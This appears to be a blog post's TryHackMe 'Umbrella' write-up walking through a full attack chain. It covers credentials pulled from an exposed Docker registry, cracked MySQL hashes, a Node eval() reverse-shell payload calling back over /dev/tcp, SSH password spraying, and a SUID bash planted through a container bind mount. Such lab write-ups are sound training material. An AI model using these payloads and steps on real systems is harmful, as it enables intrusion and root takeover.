@@ -1,0 +1,123 @@
+<!doctype html><html lang="en" data-theme="dark"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <meta name="description" content="An exposed Docker registry leaks database credentials, leading through cracked hashes, command injection, and a privileged container to root."/><meta name="theme-color" content="#0c1522"/><meta property="og:site_name" content="verox"/>
+    <meta property="og:title" content="Umbrella | verox"/><meta property="og:description" content="An exposed Docker registry leaks database credentials, leading through cracked hashes, command injection, and a privileged container to root."/>
+    <title>Umbrella | verox</title><link rel="icon" href="/assets/avatar-king.png?v=verox-20261024-tryhackme"/><link rel="stylesheet" href="/assets/style.css?v=verox-20261024-tryhackme"/>
+    <script>try{const t=localStorage.getItem('verox-theme')||'dark';document.documentElement.dataset.theme=t==='system'?(matchMedia('(prefers-color-scheme: light)').matches?'light':'dark'):t}catch(e){}</script></head>
+    <body><aside class="sidebar" id="sidebar">
+    <div class="identity"><a href="/writeups/" aria-label="verox Writeups"><img class="portrait" src="/assets/avatar-king.png?v=verox-20261024-tryhackme" alt="verox crowned king avatar"/></a><a class="brand" href="/writeups/">verox</a><p class="subtitle">Writeups &amp; Thoughts</p></div>
+    <nav class="side-nav" aria-label="Primary"><a class="nav-item active" href="/writeups/" aria-current="page"><svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20.24 12.24a6 6 0 0 0-8.49-8.49L3 12.5V21h8.5z"/><path d="m16 8-2 2"/><path d="M3 21l9-9"/></svg><span>WRITEUPS</span></a><a class="nav-item" href="/thoughts/" ><svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 18V5a3 3 0 0 0-5.5-1.6A4 4 0 0 0 4 10a4 4 0 0 0 2 7 4 4 0 0 0 6 1"/><path d="M12 18V5a3 3 0 0 1 5.5-1.6A4 4 0 0 1 20 10a4 4 0 0 1-2 7 4 4 0 0 1-6 1"/><path d="M9 9c-2 0-3 1-3 3m9-3c2 0 3 1 3 3"/></svg><span>THOUGHTS</span></a><a class="nav-item" href="/archives/" ><svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="4" width="18" height="4" rx="1"/><path d="M5 8v12h14V8M10 12h4"/></svg><span>ARCHIVES</span></a><a class="nav-item" href="/categories/" ><svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 6h16M4 12h16M4 18h16"/></svg><span>CATEGORIES</span></a><a class="nav-item" href="/tags/" ><svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 12l-8 8-9-9V4h7z"/><circle cx="7.5" cy="8" r="1"/></svg><span>TAGS</span></a></nav>
+    <div class="social-wrap"><div class="social-icons"><a class="social-link" href="/writeups/" title="Website" aria-label="Website"><svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="2" y="3" width="20" height="15" rx="2"/><path d="M8 22h8m-4-4v4"/></svg></a><a class="social-link" href="https://github.com/abdullah-5j" title="GitHub" aria-label="GitHub" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M9 19c-4.3 1.3-4.3-2.2-6-2.5M9 22v-3.3c-4.5 1-6-1.8-6-5.3a5 5 0 0 1 1.3-3.5c-.1-.8-.5-2.4.2-3.7 0 0 1.4-.4 4 1.6a13 13 0 0 1 7 0c2.6-2 4-1.6 4-1.6.7 1.3.3 2.9.2 3.7a5 5 0 0 1 1.3 3.5c0 3.5-1.5 6.3-6 5.3V22"/></svg></a><a class="social-link" href="https://x.com/abdullah5j009" title="X" aria-label="X" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 3l18 18M3 21 21 3M3 3h4l14 18h-4L3 3z"/></svg></a><a class="social-link" href="https://medium.com/@abdullah5j009" title="Medium" aria-label="Medium" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="5.5" cy="12" r="4.6" fill="currentColor" stroke="none"/><ellipse cx="15.5" cy="12" rx="2.7" ry="4.4" fill="currentColor" stroke="none"/><ellipse cx="21" cy="12" rx="1.2" ry="4.1" fill="currentColor" stroke="none"/></svg></a><a class="social-link" href="https://tryhackme.com/p/Verox." title="TryHackMe" aria-label="TryHackMe" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="5"/><circle cx="12" cy="12" r="1"/></svg></a><a class="social-link" href="https://app.hackthebox.com/users/2654143" title="Hack The Box" aria-label="Hack The Box" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 2 9 5v10l-9 5-9-5V7zM3 7l9 5 9-5m-9 5v10"/></svg></a><button type="button" class="social-link" id="discord-copy" title="Copy Discord username: notabdu11ah" aria-label="Copy Discord username: notabdu11ah"><svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M18 5c-2-1-3-1.2-4-1.4l-.5 1.1a13 13 0 0 0-3 0L10 3.6C9 3.8 8 4 6 5 4 8 3 11 3 17c2 1.5 3.5 2.3 5 2.7l1-1.6m8 0 1 1.6c1.5-.4 3-1.2 5-2.7 0-6-1-9-3-12z"/><circle cx="9" cy="12" r="1"/><circle cx="15" cy="12" r="1"/></svg></button><span id="theme-control-container"><button id="theme-toggle" class="theme-control" aria-label="Choose appearance" aria-expanded="false" title="Appearance"><svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 15.2A8 8 0 0 1 8.8 4 8 8 0 1 0 20 15.2Z"/></svg></button><span class="theme-menu" id="theme-menu" role="menu"><button type="button" data-theme-choice="light">☀ &nbsp; Light</button><button type="button" data-theme-choice="dark">☾ &nbsp; Dark</button><button type="button" data-theme-choice="system">▣ &nbsp; System</button></span></span></div></div><div class="copyright">© 2026 verox</div>
+    </aside><div class="shell"><header class="topbar"><div class="crumbs"><button class="mobile-trigger" id="mobile-trigger" aria-label="Toggle menu"><svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 6h16M4 12h16M4 18h16"/></svg></button><a href="/writeups/">verox</a><span class="crumb-sep">›</span><span>Umbrella</span></div><button type="button" class="search-pill" id="open-search" aria-label="Search articles"><svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="10.7" cy="10.7" r="7.5"/><path d="m16.5 16.5 4.6 4.6"/></svg>Search...</button></header>
+    <div class="layout"><main class="main-content" id="main"><article class="article"><div class="heading-block"><h1>Umbrella</h1><div class="article-meta">Aug 13, 2026 · 4:16 PM · TryHackMe</div></div><div class="article-body"><p><strong>Category:</strong> Boot2Root · <strong>Difficulty:</strong> Medium</p>
+<p><strong>Tags:</strong> <code>docker-registry</code> <code>credential-reuse</code> <code>nodejs</code> <code>eval-rce</code> <code>container-escape</code> <code>bind-mount</code></p>
+<p>Umbrella Corp has been developing a time-tracking application. This one isn't a single bug — it's a chain: an exposed Docker registry leaks the app image, the image leaks the DB password, the database hands over crackable user hashes, the app itself runs <code>eval()</code> on user input, and a root container with a host bind-mount turns a foothold into full root.</p>
+<hr />
+<h2 id="recon">Recon</h2>
+<p>Full port and service scan of the target.</p>
+<pre><code class="language-bash">nmap -sC -sV -p- -T4 -oN umbrella.txt 10.114.190.83
+</code></pre>
+<p><img src="/assets/images/tryhackme/umbrella/nmap.png" alt="nmap scan" /></p>
+<p>Four services: SSH (22), MySQL 5.7 (3306), a Docker Registry (5000), and a Node.js/Express app titled &quot;Login&quot; (8080).</p>
+<hr />
+<h2 id="enumerating-the-docker-registry">Enumerating the Docker Registry</h2>
+<p>An exposed registry will usually let you list what images it's hosting, so I queried the catalog.</p>
+<pre><code class="language-bash">curl -s http://10.114.190.83:5000/v2/_catalog
+</code></pre>
+<p><img src="/assets/images/tryhackme/umbrella/registry-catalog.png" alt="registry catalog" /></p>
+<p>One repository: <code>umbrella/timetracking</code> — that's the app's own image, which means we can pull it and read the source and config.</p>
+<p>Grabbed the image tags and manifest to find the config blob and layers.</p>
+<pre><code class="language-bash">curl -s http://10.114.190.83:5000/v2/umbrella/timetracking/manifests/latest
+</code></pre>
+<p><img src="/assets/images/tryhackme/umbrella/registry-manifest.png" alt="registry manifest" /></p>
+<p>The manifest gives us the config blob digest, where Docker stores the image's environment variables.</p>
+<hr />
+<h2 id="db-password-from-the-image-config">DB Password from the Image Config</h2>
+<p>Pulled the config blob and grepped it for anything secret-looking.</p>
+<pre><code class="language-bash">curl -s http://10.114.190.83:5000/v2/umbrella/timetracking/blobs/sha256:7843f10...a286 -o config.json
+cat config.json | python3 -m json.tool | grep -iE &quot;pass|db_|env&quot;
+</code></pre>
+<p><img src="/assets/images/tryhackme/umbrella/db-password.png" alt="db password in config" /></p>
+<p>The DB password was baked straight into the image <code>ENV</code>: <strong><code>DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5</code></strong> (also <code>DB_USER=root</code>, <code>DB_DATABASE=timetracking</code>). That answers the first question.</p>
+<hr />
+<h2 id="database-access">Database Access</h2>
+<p>MySQL is exposed on 3306, so I connected with the recovered password and dumped the users table.</p>
+<pre><code class="language-bash">mysql -h 10.114.190.83 -u root -p'Ng1-f3!Pe7-e5?Nf3xe5' --skip-ssl timetracking -e &quot;select * from users;&quot;
+</code></pre>
+<p><img src="/assets/images/tryhackme/umbrella/mysql-users.png" alt="mysql users table" /></p>
+<p>Four users, each with a 32-character MD5 password hash.</p>
+<hr />
+<h2 id="cracking-the-hashes">Cracking the Hashes</h2>
+<p>Saved the four hashes and threw rockyou at them with John.</p>
+<pre><code class="language-bash">john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+</code></pre>
+<p><img src="/assets/images/tryhackme/umbrella/john-crack.png" alt="john cracked passwords" /></p>
+<p>All four fell instantly: <code>Password1</code>, <code>letmein</code>, <code>sunshine1</code>, <code>sandwich</code>.</p>
+<p>Mapped each cracked password back to its user by re-hashing.</p>
+<p><img src="/assets/images/tryhackme/umbrella/user-pass-map.png" alt="user password mapping" /></p>
+<p>Final pairs: <code>claire-r:Password1</code>, <code>chris-r:letmein</code>, <code>jill-v:sunshine1</code>, <code>barry-b:sandwich</code>.</p>
+<hr />
+<h2 id="the-web-app">The Web App</h2>
+<p>Browsed to the app on 8080 — a simple login page.</p>
+<p><img src="/assets/images/tryhackme/umbrella/login-page.png" alt="login page" /></p>
+<p>Logged in as <code>barry-b:sandwich</code> and landed on the time-tracking dashboard.</p>
+<p><img src="/assets/images/tryhackme/umbrella/dashboard-eval.png" alt="dashboard with eval hint" /></p>
+<p>The &quot;Increase time spent&quot; panel has a telling hint: <em>&quot;Pro Tip: You can also use mathematical expressions, e.g. 5+4.&quot;</em> Submitting <code>5+4</code> bumps the time by 9 minutes, so the input is being evaluated server-side — a classic sign of <code>eval()</code>.</p>
+<hr />
+<h2 id="rce-via-eval">RCE via eval()</h2>
+<p>A blocking reverse-shell payload hung the single-threaded Node process, so I used a detached spawn that returns immediately. Started a listener and submitted the payload in the time field.</p>
+<pre><code class="language-bash">nc -lvnp 4444
+</code></pre>
+<pre><code class="language-js">global.process.mainModule.require('child_process').spawn('bash',['-c','bash -i &gt;&amp; /dev/tcp/192.168.152.228/4444 0&gt;&amp;1'],{detached:true,stdio:'ignore'}).unref()
+</code></pre>
+<p><img src="/assets/images/tryhackme/umbrella/reverse-shell.png" alt="reverse shell as root in container" /></p>
+<p>Shell landed as <strong>root but inside a container</strong> (<code>root@de0610f51845</code>), not the host.</p>
+<p>Confirmed the root cause in the source once I was in.</p>
+<pre><code class="language-bash">sed -n '68,74p' /usr/src/app/app.js
+</code></pre>
+<p><img src="/assets/images/tryhackme/umbrella/app-source-eval.png" alt="vulnerable eval in app.js" /></p>
+<p>The <code>/time</code> route runs <code>parseInt(eval(request.body.time))</code> — user input straight into <code>eval()</code>.</p>
+<hr />
+<h2 id="foothold-on-the-host">Foothold on the Host</h2>
+<p>The container passwords weren't reused for SSH as-is, so I sprayed each cracked credential against the host's SSH.</p>
+<pre><code class="language-bash">sshpass -p 'Password1' ssh claire-r@10.114.190.83 id
+</code></pre>
+<p>Only <strong>claire-r:Password1</strong> worked. Logged in and grabbed the user flag from her home directory.</p>
+<pre><code class="language-bash">ls -la
+cat user.txt
+</code></pre>
+<p><img src="/assets/images/tryhackme/umbrella/user-flag.png" alt="user flag" /></p>
+<p><strong>User flag captured.</strong></p>
+<hr />
+<h2 id="privilege-escalation-container-escape-via-bind-mount">Privilege Escalation — Container Escape via Bind Mount</h2>
+<p><code>sudo -l</code> was denied and SUID/cron were clean, but claire-r's home had a <code>timeTracker-src</code> directory. Its <code>docker-compose.yml</code> showed the app container mounts <code>./logs</code> from the host and runs as root — and the <code>logs</code> directory is owned and writable by claire-r. Since the container runs as root and writes persist to the host through the bind mount, I could plant a root-owned SUID bash from inside the container.</p>
+<p>Back in the container root shell, copied bash into the mounted directory and set the SUID bit.</p>
+<pre><code class="language-bash">cp /bin/bash /logs/root_shell
+chmod 4755 /logs/root_shell
+</code></pre>
+<p><img src="/assets/images/tryhackme/umbrella/suid-container.png" alt="suid bash created in container" /></p>
+<p>The binary is now <code>root:root</code> with the SUID bit set, sitting in the shared mount.</p>
+<p>On the host as claire-r, that same file appears in <code>~/timeTracker-src/logs</code>, so I ran it with <code>-p</code> to keep the elevated privileges.</p>
+<pre><code class="language-bash">cd ~/timeTracker-src/logs
+./root_shell -p
+id
+</code></pre>
+<p><img src="/assets/images/tryhackme/umbrella/root-access.png" alt="root access" /></p>
+<p><code>euid=0(root)</code> — a SUID binary runs with the owner's effective UID, so we now have root.</p>
+<hr />
+<h2 id="root-flag">Root Flag</h2>
+<pre><code class="language-bash">cat /root/root.txt
+</code></pre>
+<p><img src="/assets/images/tryhackme/umbrella/root-flag.png" alt="root flag" /></p>
+<p><strong>Root flag captured.</strong></p>
+<hr />
+<h2 id="answers">Answers</h2>
+<ul>
+<li><strong>DB password:</strong> <code>Ng1-f3!Pe7-e5?Nf3xe5</code></li>
+<li><strong>User flag:</strong> captured from <code>/home/claire-r/user.txt</code></li>
+<li><strong>Root flag:</strong> captured from <code>/root/root.txt</code></li>
+</ul>
+</div></article></main><aside class="rail" aria-label="Related content"><div class="rail-section"><h2>Recently Updated</h2><a class="recent-link" href="/writeups/tryhackme/corp-website/">Corp Website</a><a class="recent-link" href="/writeups/tryhackme/cupidbot/">CupidBot</a><a class="recent-link" href="/writeups/tryhackme/tryheartme/">TryHeartMe</a><a class="recent-link" href="/writeups/tryhackme/speed-chatting/">Speed Chatting</a><a class="recent-link" href="/writeups/tryhackme/umbrella/">Umbrella</a></div>
+    <div class="rail-section"><h2>Topics</h2><div class="mini-tags"><a class="mini-tag" href="/tags/?tag=web-security">web-security</a><a class="mini-tag" href="/tags/?tag=binary-exploitation">binary-exploitation</a><a class="mini-tag" href="/tags/?tag=reverse-engineering">reverse-engineering</a><a class="mini-tag" href="/tags/?tag=digital-forensics">digital-forensics</a><a class="mini-tag" href="/tags/?tag=malware-analysis">malware-analysis</a><a class="mini-tag" href="/tags/?tag=windows-security">windows-security</a><a class="mini-tag" href="/tags/?tag=linux">linux</a><a class="mini-tag" href="/tags/?tag=network-security">network-security</a><a class="mini-tag" href="/tags/?tag=ctf">ctf</a><a class="mini-tag" href="/tags/?tag=privilege-escalation">privilege-escalation</a></div></div></aside></div>
+    <footer class="footer"><span>© 2026 <a href="/writeups/">verox</a>. Some rights reserved.</span><span>Design inspired by <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener noreferrer">Chirpy</a>.</span></footer></div>
+    <div class="search-backdrop" id="search-backdrop" role="dialog" aria-modal="true" aria-label="Search writeups"><div class="search-dialog"><div class="search-input-row"><svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="10.7" cy="10.7" r="7.5"/><path d="m16.5 16.5 4.6 4.6"/></svg><input type="search" autocomplete="off" id="search-input" aria-label="Search posts" placeholder="Search writeups and thoughts..."/><button id="close-search" class="close-search" type="button" aria-label="Close search">Esc</button></div><div class="search-results" id="search-results"></div></div></div>
+    <script src="/assets/app.js?v=verox-20261024-tryhackme" defer></script></body></html>
